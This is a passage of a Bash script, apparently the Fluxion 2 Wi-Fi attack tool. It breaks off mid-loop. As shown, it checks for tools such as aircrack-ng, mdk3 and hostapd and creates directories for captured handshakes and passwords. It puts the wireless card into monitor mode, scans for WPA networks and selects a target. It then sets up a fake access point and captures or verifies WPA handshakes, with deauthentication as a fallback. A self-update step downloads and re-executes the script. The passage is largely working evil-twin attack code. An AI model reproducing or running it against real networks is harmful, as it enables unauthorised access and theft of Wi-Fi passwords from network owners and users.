#!/bin/bash

########## DEBUG Mode ##########
if [ -z ${FLUX_DEBUG+x} ]; then FLUX_DEBUG=0
    else FLUX_DEBUG=1
fi
################################

####### preserve network #######
if [ -z ${KEEP_NETWORK+x} ]; then KEEP_NETWORK=0
    else KEEP_NETWORK=1
fi
################################

###### AUTO CONFIG SETUP #######
if [ -z ${FLUX_AUTO+x} ]; then FLUX_AUTO=0
    else FLUX_AUTO=1
fi
################################

if [[ $EUID -ne 0 ]]; then
        echo -e "\e[1;31mYou don't have admin privilegies, execute the script as root.""\e[0m"""
        exit 1
fi

if [ -z "${DISPLAY:-}" ]; then
    echo -e "\e[1;31mThe script should be exected inside a X (graphical) session.""\e[0m"""
    exit 1
fi

clear

##################################### < CONFIGURATION  > #####################################
DUMP_PATH="/tmp/TMPflux"
HANDSHAKE_PATH="/root/handshakes"
PASSLOG_PATH="/root/pwlog"
WORK_DIR=`pwd`
DEAUTHTIME="9999999999999"
revision=9
version=2
IP=192.168.1.1
RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)

#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
transparent="\e[0m"

general_back="Back"
general_error_1="Not_Found"
general_case_error="Unknown option. Choose again"
general_exitmode="Cleaning and closing"
general_exitmode_1="Disabling monitoring interface"
general_exitmode_2="Disabling interface"
general_exitmode_3="Disabling "$grey"forwarding of packets"
general_exitmode_4="Cleaning "$grey"iptables"
general_exitmode_5="Restoring "$grey"tput"
general_exitmode_6="Restarting "$grey"Network-Manager"
general_exitmode_7="Cleanup performed successfully!"
general_exitmode_8="Thanks for using fluxion"
#############################################################################################

# DEBUG MODE = 0 ; DEBUG MODE = 1 [Normal Mode / Developer Mode]
if [ $FLUX_DEBUG = 1 ]; then
        ## Developer Mode
        export flux_output_device=/dev/stdout
        HOLD="-hold"
else
        ## Normal Mode
        export flux_output_device=/dev/null
        HOLD=""
fi

# Delete Log only in Normal Mode !
function conditional_clear() {

        if [[ "$flux_output_device" != "/dev/stdout" ]]; then clear; fi
}

function airmon {
        chmod +x lib/airmon/airmon.sh
}
airmon

# Check Updates
function checkupdatess {

        revision_online="$(timeout -s SIGTERM 20 curl "https://raw.githubusercontent.com/FluxionNetwork/fluxion/master/fluxion" 2>/dev/null| grep "^revision" | cut -d "=" -f2)"
        if [ -z "$revision_online" ]; then
                echo "?">$DUMP_PATH/Irev
        else
                echo "$revision_online">$DUMP_PATH/Irev
        fi

}

# Animation
function spinner {

        local pid=$1
        local delay=0.15
        local spinstr='|/-\'
                while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
                        local temp=${spinstr#?}
                        printf " [%c]  " "$spinstr"
                        local spinstr=$temp${spinstr%"$temp"}
                        sleep $delay
                        printf "\b\b\b\b\b\b"
                done
        printf "    \b\b\b\b"
}

# ERROR Report only in Developer Mode
function err_report {
        echo "Error on line $1"
}

if [ $FLUX_DEBUG = 1 ]; then
        trap 'err_report $LINENUM' ERR
fi

#Function to executed in case of unexpected termination
trap exitmode SIGINT SIGHUP

source lib/exitmode.sh

#Languages for the web interface
source language/source

# Design
function top(){

        conditional_clear
        echo -e "$red[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]"
        echo -e "$red[                                                      ]"
  echo -e "$red[  $red    FLUXION $version" "${yellow} ${red}  < F""${yellow}luxion" "${red}I""${yellow}s" "${red}T""${yellow}he ""${red}F""${yellow}uture >     "              ${blue}"    ]"
        echo -e "$blue[                                                      ]"
        echo -e "$blue[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]""$transparent"
        echo
        echo

}

############################################## < START > ##############################################

# Check requirements
function checkdependences {

        echo -ne "aircrack-ng....."
        if ! hash aircrack-ng 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "aireplay-ng....."
        if ! hash aireplay-ng 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "airmon-ng......."
        if ! hash airmon-ng 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "airodump-ng....."
        if ! hash airodump-ng 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "awk............."
        if ! hash awk 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "curl............"
        if ! hash curl 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "dhcpd..........."
        if ! hash dhcpd 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent" (isc-dhcp-server)"
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "hostapd........."
        if ! hash hostapd 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "iwconfig........"
        if ! hash iwconfig 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "lighttpd........"
        if ! hash lighttpd 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "macchanger......"
        if ! hash macchanger 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
            echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "mdk3............"
        if ! hash mdk3 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1

        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "nmap............"
        if ! [ -f /usr/bin/nmap ]; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "php-cgi........."
        if ! [ -f /usr/bin/php-cgi ]; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "pyrit..........."
        if ! hash pyrit 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "python.........."
        if ! hash python 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "unzip..........."
        if ! hash unzip 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "xterm..........."
        if ! hash xterm 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "openssl........."
        if ! hash openssl 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "rfkill.........."
        if ! hash rfkill 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "strings........."
        if ! hash strings 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent" (binutils)"
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "fuser..........."
        if ! hash fuser 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent" (psmisc)"
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025



        if [ "$exit" = "1" ]; then
        exit 1
        fi

        sleep 1
        clear
}
top
checkdependences

# Create working directory
if [ ! -d $DUMP_PATH ]; then
        mkdir -p $DUMP_PATH &>$flux_output_device
fi

# Create handshake directory
if [ ! -d $HANDSHAKE_PATH ]; then
        mkdir -p $HANDSHAKE_PATH &>$flux_output_device
fi

#create password log directory
if [ ! -d $PASSLOG_PATH ]; then
        mkdir -p $PASSLOG_PATH &>$flux_output_device
fi



if [ $FLUX_DEBUG != 1 ]; then
        clear; echo ""
                   sleep 0.01 && echo -e "$red "
           sleep 0.01 && echo -e "         ⌠▓▒▓▒   ⌠▓╗     ⌠█┐ ┌█   ┌▓\  /▓┐   ⌠▓╖   ⌠◙▒▓▒◙   ⌠█\  ☒┐    "
           sleep 0.01 && echo -e "         ║▒_     │▒║     │▒║ ║▒    \▒\/▒/    │☢╫   │▒┌╤┐▒   ║▓▒\ ▓║    "
           sleep 0.01 && echo -e "         ≡◙◙     ║◙║     ║◙║ ║◙      ◙◙      ║¤▒   ║▓║☯║▓   ♜◙\✪\◙♜    "
           sleep 0.01 && echo -e "         ║▒      │▒║__   │▒└_┘▒    /▒/\▒\    │☢╫   │▒└╧┘▒   ║█ \▒█║    "
           sleep 0.01 && echo -e "         ⌡▓      ⌡◘▒▓▒   ⌡◘▒▓▒◘   └▓/  \▓┘   ⌡▓╝   ⌡◙▒▓▒◙   ⌡▓  \▓┘    "
           sleep 0.01 && echo -e "        ¯¯¯     ¯¯¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯    ¯¯¯ ¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯¯¯¯¯¯  "

        echo""

        sleep 0.1
        echo -e $red"                     FLUXION "$white""$version" (rev. "$green "$revision"$white") "$yellow"by "$white" ghost"
        sleep 0.1
        echo -e $green "           Page:"$red"https://github.com/FluxionNetwork/fluxion  "$transparent
        sleep 0.1
        echo -n "                              Latest rev."
        tput civis
        checkupdatess &
        spinner "$!"
        revision_online=$(cat $DUMP_PATH/Irev)
        echo -e ""$white" [${purple}${revision_online}$white"$transparent"]"
                if [ "$revision_online" != "?" ]; then

                        if [ "$revision" -lt "$revision_online" ]; then
                                echo
                                echo
                                echo -ne $red"            New revision found! "$yellow
                                echo -ne "Update? [Y/n]: "$transparent
                                read -N1 doupdate
                                echo -ne "$transparent"
                                doupdate=${doupdate:-"Y"}

                            if [ "$doupdate" = "Y" ]; then
                                cp $0 $HOME/flux_rev-$revision.backup
                                curl "https://raw.githubusercontent.com/FluxionNetwork/fluxion/master/fluxion" -s -o $0
                                echo
                                echo
                                echo -e ""$red"Updated successfully! Restarting the script to apply the changes ..."$transparent""
                                sleep 3
                                chmod +x $0
                                exec $0
                                exit
                            fi
                        fi
                fi
        echo ""
        tput cnorm
        sleep 1

fi

# Show info for the selected AP
function infoap {

        Host_MAC_info1=`echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' | tr [:upper:] [:lower:]`
        Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | cut -d " " -f 5-`
        echo "INFO WIFI"
        echo
        echo -e "               "$blue"SSID"$transparent" = $Host_SSID / $Host_ENC"
        echo -e "               "$blue"Channel"$transparent" = $channel"
        echo -e "               "$blue"Speed"$transparent" = ${speed:2} Mbps"
        echo -e "               "$blue"BSSID"$transparent" = $mac (\e[1;33m$Host_MAC_MODEL $transparent)"
        echo
}
############################################### < MENU > ###############################################

# Windows + Resolution
function setresolution {

        function resA {

                TOPLEFT="-geometry 90x13+0+0"
                TOPRIGHT="-geometry 83x26-0+0"
                BOTTOMLEFT="-geometry 90x24+0-0"
                BOTTOMRIGHT="-geometry 75x12-0-0"
                TOPLEFTBIG="-geometry 91x42+0+0"
                TOPRIGHTBIG="-geometry 83x26-0+0"
        }

        function resB {

                TOPLEFT="-geometry 92x14+0+0"
                TOPRIGHT="-geometry 68x25-0+0"
                BOTTOMLEFT="-geometry 92x36+0-0"
                BOTTOMRIGHT="-geometry 74x20-0-0"
                TOPLEFTBIG="-geometry 100x52+0+0"
                TOPRIGHTBIG="-geometry 74x30-0+0"
        }
        function resC {

                TOPLEFT="-geometry 100x20+0+0"
                TOPRIGHT="-geometry 109x20-0+0"
                BOTTOMLEFT="-geometry 100x30+0-0"
                BOTTOMRIGHT="-geometry 109x20-0-0"
                TOPLEFTBIG="-geometry  100x52+0+0"
                TOPRIGHTBIG="-geometry 109x30-0+0"
        }
        function resD {
                TOPLEFT="-geometry 110x35+0+0"
                TOPRIGHT="-geometry 99x40-0+0"
                BOTTOMLEFT="-geometry 110x35+0-0"
                BOTTOMRIGHT="-geometry 99x30-0-0"
                TOPLEFTBIG="-geometry 110x72+0+0"
                TOPRIGHTBIG="-geometry 99x40-0+0"
        }
        function resE {
                TOPLEFT="-geometry 130x43+0+0"
                TOPRIGHT="-geometry 68x25-0+0"
                BOTTOMLEFT="-geometry 130x40+0-0"
                BOTTOMRIGHT="-geometry 132x35-0-0"
                TOPLEFTBIG="-geometry 130x85+0+0"
                TOPRIGHTBIG="-geometry 132x48-0+0"
        }
        function resF {
                TOPLEFT="-geometry 100x17+0+0"
                TOPRIGHT="-geometry 90x27-0+0"
                BOTTOMLEFT="-geometry 100x30+0-0"
                BOTTOMRIGHT="-geometry 90x20-0-0"
                TOPLEFTBIG="-geometry  100x70+0+0"
                TOPRIGHTBIG="-geometry 90x27-0+0"
}

detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)
##  A) 1024x600
##  B) 1024x768
##  C) 1280x768
##  D) 1280x1024
##  E) 1600x1200
case $detectedresolution in
        "1024x600" ) resA ;;
        "1024x768" ) resB ;;
        "1280x768" ) resC ;;
        "1366x768" ) resC ;;
        "1280x1024" ) resD ;;
        "1600x1200" ) resE ;;
        "1366x768"  ) resF ;;
                  * ) resA ;;
esac

language; setinterface
}

function language {

    iptables-save > $DUMP_PATH/iptables-rules
    conditional_clear

if [ "$FLUX_AUTO" =  "1" ];then
        source $WORK_DIR/language/en; setinterface

else

        while true; do
                conditional_clear
                top

                echo -e ""$red"["$yellow"2"$red"]"$transparent" Select your language"
                echo "                                       "
                echo -e "      "$red"["$yellow"1"$red"]"$grey" English          "
                echo -e "      "$red"["$yellow"2"$red"]"$transparent" German      "
                echo -e "      "$red"["$yellow"3"$red"]"$transparent" Romanian     "
                echo -e "      "$red"["$yellow"4"$red"]"$transparent" Turkish    "
                echo -e "      "$red"["$yellow"5"$red"]"$transparent" Spanish    "
                echo -e "      "$red"["$yellow"6"$red"]"$transparent" Chinese   "
                echo -e "      "$red"["$yellow"7"$red"]"$transparent" Italian   "
                echo -e "      "$red"["$yellow"8"$red"]"$transparent" Czech   "
                echo -e "      "$red"["$yellow"9"$red"]"$transparent" Greek   "
                echo -e "      "$red"["$yellow"10"$red"]"$transparent" French     "
                echo -e "      "$red"["$yellow"11"$red"]"$transparent" Slovenian "
                echo "                                       "
                echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
                read yn
                echo ""
                case $yn in
                    1 ) source $WORK_DIR/language/en;  break;;
                    2 ) source $WORK_DIR/language/ger; break;;
                    3 ) source $WORK_DIR/language/ro;  break;;
                    4 ) source $WORK_DIR/language/tu;  break;;
                    5 ) source $WORK_DIR/language/esp; break;;
                    6 ) source $WORK_DIR/language/ch;  break;;
                    7 ) source $WORK_DIR/language/it;  break;;
                    8 ) source $WORK_DIR/language/cz   break;;
                    9 ) source $WORK_DIR/language/gr;  break;;
                    10 ) source $WORK_DIR/language/fr; break;;
                    11 ) source $WORK_DIR/language/svn; break;;
                    * ) echo "Unknown option. Please choose again"; conditional_clear ;;
                  esac
        done
fi

}

# Choose Interface
function setinterface {

  conditional_clear
        top
        #unblock interfaces
        rfkill unblock all

        # Collect all interfaces in montitor mode & stop all
        KILLMONITOR=`iwconfig 2>&1 | grep Monitor | awk '{print $1}'`

        for monkill in ${KILLMONITOR[@]}; do
                airmon-ng stop $monkill >$flux_output_device
                echo -n "$monkill, "
        done

        # Create a variable with the list of physical network interfaces
        readarray -t wirelessifaces < <(./lib/airmon/airmon.sh    |grep "-" | cut -d- -f1)
        INTERFACESNUMBER=`./lib/airmon/airmon.sh   | grep -c "-"`


        if [ "$INTERFACESNUMBER" -gt "0" ]; then

                if [ "$INTERFACESNUMBER" -eq "1" ]; then
                        PREWIFI=$(echo ${wirelessifaces[0]} | awk '{print $1}')
                else
                        echo $header_setinterface
                        echo
                        i=0

                        for line in "${wirelessifaces[@]}"; do
                                i=$(($i+1))
                                wirelessifaces[$i]=$line
                                echo -e "      "$red"["$yellow"$i"$red"]"$transparent" $line"
                        done

                        if [ "$FLUX_AUTO" = "1" ];then
                                line="1"
                        else
                                echo
                                echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
                                read line
                        fi

                        PREWIFI=$(echo ${wirelessifaces[$line]} | awk '{print $1}')

                fi

                if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
                        conditional_clear
                        top
                        setinterface
                fi

                readarray -t naggysoftware < <(./lib/airmon/airmon.sh check $PREWIFI | tail -n +8 | grep -v "on interface" | awk '{ print $2 }')
                WIFIDRIVER=$(./lib/airmon/airmon.sh | grep "$PREWIFI" | awk '{print($(NF-2))}')

                if [ ! "$(echo $WIFIDRIVER | egrep 'rt2800|rt73')" ]; then
                rmmod -f "$WIFIDRIVER" &>$flux_output_device 2>&1
                fi

                if [ $KEEP_NETWORK = 0 ]; then

                for nagger in "${naggysoftware[@]}"; do
                        killall "$nagger" &>$flux_output_device
                done
                sleep 0.5

                fi

                if [ ! "$(echo $WIFIDRIVER | egrep 'rt2800|rt73')" ]; then
                modprobe "$WIFIDRIVER" &>$flux_output_device 2>&1
                sleep 0.5
                fi

                # Select Wifi Interface
                select PREWIFI in $INTERFACES; do
                        break;
                done

                WIFIMONITOR=$(./lib/airmon/airmon.sh start $PREWIFI | grep "enabled on" | cut -d " " -f 5 | cut -d ")" -f 1)
                WIFI_MONITOR=$WIFIMONITOR
                WIFI=$PREWIFI

                #No wireless cards
        else

                echo $setinterface_error
                sleep 5
                exitmode
        fi

        ghost
}

# Check files
function ghost {

        conditional_clear
        CSVDB=dump-01.csv

        rm -rf $DUMP_PATH/*

        choosescan
        selection
}

# Select channel
function choosescan {


        if [ "$FLUX_AUTO" = "1" ];then
                Scan
        else
         conditional_clear
                while true; do
                        conditional_clear
                        top

                        echo -e ""$red"["$yellow"2"$red"]"$transparent" $header_choosescan"
                        echo "                                       "
                        echo -e "      "$red"["$yellow"1"$red"]"$grey" $choosescan_option_1          "
                        echo -e "      "$red"["$yellow"2"$red"]"$transparent" $choosescan_option_2       "
                        echo -e "      "$red"["$yellow"3"$red"]"$red" $general_back       " $transparent
                        echo "                                       "
                        echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
                        read yn
                        echo ""
                        case $yn in
                                1 ) Scan ; break ;;
                                2 ) Scanchan ; break ;;
                                3 ) setinterface; break;;
                                * ) echo "Unknown option. Please choose again"; conditional_clear ;;
                          esac
                done
        fi
}

# Choose your channel if you choose option 2 before
function Scanchan {

        conditional_clear
        top

          echo "                                       "
          echo -e ""$red"["$yellow"2"$red"]"$transparent" $header_choosescan     "
          echo "                                       "
          echo -e "     $scanchan_option_1 "$blue"6"$transparent"               "
          echo -e "     $scanchan_option_2 "$blue"1-5"$transparent"             "
          echo -e "     $scanchan_option_2 "$blue"1,2,5-7,11"$transparent"      "
          echo "                                       "
        echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
        read channel_number
        set -- ${channel_number}
        conditional_clear

        rm -rf $DUMP_PATH/dump*
        xterm $HOLD -title "$header_scanchan [$channel_number]" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng --encrypt WPA -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR --ignore-negative-one
}

# Scans the entire network
function Scan {

        conditional_clear
        rm -rf $DUMP_PATH/dump*

        if [ "$FLUX_AUTO" = "1" ];then
                sleep 30 && killall xterm &
        fi
        xterm $HOLD -title "$header_scan" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng --encrypt WPA -w $DUMP_PATH/dump -a $WIFI_MONITOR --ignore-negative-one

}

# Choose a network
function selection {

        conditional_clear
        top


        LINEAS_WIFIS_CSV=`wc -l $DUMP_PATH/$CSVDB | awk '{print $1}'`

        if [ "$LINEAS_WIFIS_CSV" = "" ];then
                conditional_clear
                top
                echo -e ""$red"["$yellow"2"$red"]"$transparent" Error: your wireless card  isn't supported  "
                echo -n -e $transparent"Do you want exit? "$red"["$yellow"Y"$transparent"es / "$yellow"N"$transparent"o"$red"]"$transparent":"
                read back
                if [ $back = 'n' ] && [ $back = 'N' ] && [ $back = 'no' ] && [ $back = 'No' ];then
                        clear && exitmode

                elif [ $back = 'y' ] && [ $back = 'Y' ] && [ $back = 'yes' ] && [ $back = 'Yes' ];then
                        clear && setinterface
                fi

        fi

        if [ $LINEAS_WIFIS_CSV -le 3 ]; then
                ghost && break
        fi

        fluxionap=`cat $DUMP_PATH/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
        fluxionap=`expr $fluxionap - 1`
        head -n $fluxionap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv
        tail -n +$fluxionap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv
        echo "                        WIFI LIST "
        echo ""
        echo " ID      MAC                      CHAN    SECU     PWR   ESSID"
        echo ""
        i=0

        while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
                longueur=${#MAC}
                PRIVACY=$(echo $PRIVACY| tr -d "^ ")
                PRIVACY=${PRIVACY:0:4}
                if [ $longueur -ge 17 ]; then
                        i=$(($i+1))
                        POWER=`expr $POWER + 100`
                        CLIENTE=`cat $DUMP_PATH/clientes.csv | grep $MAC`

                        if [ "$CLIENTE" != "" ]; then
                                CLIENTE="*"
                        echo -e " "$red"["$yellow"$i"$red"]"$green"$CLIENTE\t""$red"$MAC"\t""$red "$CHANNEL"\t""$green" $PRIVACY"\t  ""$red"$POWER%"\t""$red "$ESSID""$transparent""

                        else

                        echo -e " "$red"["$yellow"$i"$red"]"$white"$CLIENTE\t""$yellow"$MAC"\t""$green "$CHANNEL"\t""$blue" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green "$ESSID""$transparent""

                        fi

                        aidlength=$IDLENGTH
                        assid[$i]=$ESSID
                        achannel[$i]=$CHANNEL
                        amac[$i]=$MAC
                        aprivacy[$i]=$PRIVACY
                        aspeed[$i]=$SPEED
                fi
        done < $DUMP_PATH/dump-02.csv

        # Select the first network if you select the first network
        if [ "$FLUX_AUTO" = "1" ];then
                choice=1
        else
                echo
                echo -e ""$blue "("$white"*"$blue") $selection_1"$transparent""
                echo ""
                echo -e "        $selection_2"
                echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
                read choice
        fi

        if [[ $choice -eq "r" ]]; then
                ghost
        fi

        idlength=${aidlength[$choice]}
        ssid=${assid[$choice]}
        channel=$(echo ${achannel[$choice]}|tr -d [:space:])
        mac=${amac[$choice]}
        privacy=${aprivacy[$choice]}
        speed=${aspeed[$choice]}
        Host_IDL=$idlength
        Host_SPEED=$speed
        Host_ENC=$privacy
        Host_MAC=$mac
        Host_CHAN=$channel
        acouper=${#ssid}
        fin=$(($acouper-idlength))
        Host_SSID=${ssid:1:fin}
        Host_SSID2=`echo $Host_SSID | sed 's/ //g' | sed 's/\[//g;s/\]//g' | sed 's/\://g;s/\://g' | sed 's/\*//g;s/\*//g' | sed 's/(//g' | sed 's/)//g'`
        conditional_clear

        askAP
}


# FakeAP
function askAP {

        DIGITOS_WIFIS_CSV=`echo "$Host_MAC" | wc -m`

        if [ $DIGITOS_WIFIS_CSV -le 15 ]; then
                selection && break
        fi

        if [ "$(echo $WIFIDRIVER | grep 8187)" ]; then
                fakeapmode="airbase-ng"
                askauth
        fi

        if [ "$FLUX_AUTO" = "1" ];then
                fakeapmode="hostapd"; authmode="handshake"; handshakelocation
        else
                top
                while true; do

                        infoap

                        echo -e ""$red"["$yellow"2"$red"]"$transparent" $header_askAP"
                        echo "                                       "
                        echo -e "      "$red"["$yellow"1"$red"]"$grey" $askAP_option_1"
                        echo -e "      "$red"["$yellow"2"$red"]"$transparent" $askAP_option_2"
                        echo -e "      "$red"["$yellow"3"$red"]"$red" $general_back" $transparent
                        echo "                                       "
                        echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
                        read yn
                        echo ""
                        case $yn in
                                1 ) fakeapmode="hostapd"; authmode="handshake"; handshakelocation; break ;;
                                2 ) fakeapmode="airbase-ng"; askauth; break ;;
                                3 ) selection; break ;;
                                * ) echo "$general_case_error"; conditional_clear ;;
                        esac
                done
        fi
}

# Test Passwords / airbase-ng
function askauth {

        if [ "$FLUX_AUTO" = "1" ];then
                authmode="handshake"; handshakelocation
        else
                conditional_clear

                top
                while true; do

                        echo -e ""$red"["$yellow"2"$red"]"$transparent" $header_askauth"
                        echo "                                       "
                        echo -e "      "$red"["$yellow"1"$red"]"$grey" $askauth_option_1"
                        echo -e "      "$red"["$yellow"2"$red"]"$transparent" $askauth_option_2"
                        echo -e "      "$red"["$yellow"3"$red"]"$red" $general_back" $transparent
                        echo "                                       "
                        echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
                        read yn
                        echo ""
                        case $yn in
                                1 ) authmode="handshake"; handshakelocation; break ;;
                                2 ) authmode="wpa_supplicant";  webinterface; break ;;
                                3 ) askAP; break ;;
                                * ) echo "$general_case_error"; conditional_clear ;;
                        esac
                done
        fi
}

function handshakelocation {

        conditional_clear

        top
        infoap
        if [ -f "/root/handshakes/$Host_SSID2-$Host_MAC.cap" ]; then
                echo -e "Handshake $yellow$Host_SSID-$Host_MAC.cap$transparent found in /root/handshakes."
                echo -e "${red}Do you want to use this file? (y/N)"
                echo -ne "$transparent"

                if [ "$FLUX_AUTO" = "0" ];then
                        read usehandshakefile
                fi

                if [ "$usehandshakefile" = "y" -o "$usehandshakefile" = "Y" ]; then
                        handshakeloc="/root/handshakes/$Host_SSID2-$Host_MAC.cap"
                fi
        fi
        if [ "$handshakeloc" = "" ]; then
                echo
                echo -e "handshake location  (Example: $red$WORK_DIR.cap$transparent)"
                echo -e "Press ${yellow}ENTER$transparent to skip"
                echo
                echo -ne "Path: "

                if [ "$FLUX_AUTO" = "0" ];then
                        read handshakeloc
                fi

        fi
                if [ "$handshakeloc" = "" ]; then
                        deauthforce
                else
                        if [ -f "$handshakeloc" ]; then
                                pyrit -r "$handshakeloc" analyze &>$flux_output_device
                                pyrit_broken=$?

                                if [ $pyrit_broken = 0 ]; then
                                Host_SSID_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d "(" -f2 | cut -d "'" -f2)
                                Host_MAC_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')
                                else
                                        Host_SSID_loc=$(timeout -s SIGKILL 3 aircrack-ng "$handshakeloc" | grep WPA | grep '1 handshake' | awk '{print $3}')
                                        Host_MAC_loc=$(timeout -s SIGKILL 3 aircrack-ng "$handshakeloc" | grep WPA | grep '1 handshake' | awk '{print $2}')
                                fi


                                if [[ "$Host_MAC_loc" == *"$Host_MAC"* ]] && [[ "$Host_SSID_loc" == *"$Host_SSID"* ]]; then
                                        if [ $pyrit_broken = 0 ] && pyrit -r $handshakeloc analyze 2>&1 | sed -n /$(echo $Host_MAC | tr '[:upper:]' '[:lower:]')/,/^#/p | grep -vi "AccessPoint" | grep -qi "good,"; then
                                                cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
                                                certssl
                                        else
                                        echo -e $yellow "Corrupted handshake" $transparent
                                        echo
                                        sleep 2
                                        echo "Do you want to try aicrack-ng instead of pyrit to verify the handshake? [ENTER = NO]"
                                        echo

                                        read handshakeloc_aircrack
                                        echo -ne "$transparent"
                                        if [ "$handshakeloc_aircrack" = "" ]; then
                                                handshakelocation
                                        else
                                                if timeout -s SIGKILL 3 aircrack-ng $handshakeloc | grep -q "1 handshake"; then
                                                        cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
                                                        certssl
                                                else
                                                        echo "Corrupted handshake"
                                                        sleep 2
                                                        handshakelocation
                                                fi
                                        fi
                                        fi
                                else
                                        echo -e "${red}$general_error_1$transparent!"
                                        echo
                                        echo -e "File ${red}MAC$transparent"

                                        readarray -t lista_loc < <(pyrit -r $handshakeloc analyze 2>&1 | grep "^#")
                                                for i in "${lista_loc[@]}"; do
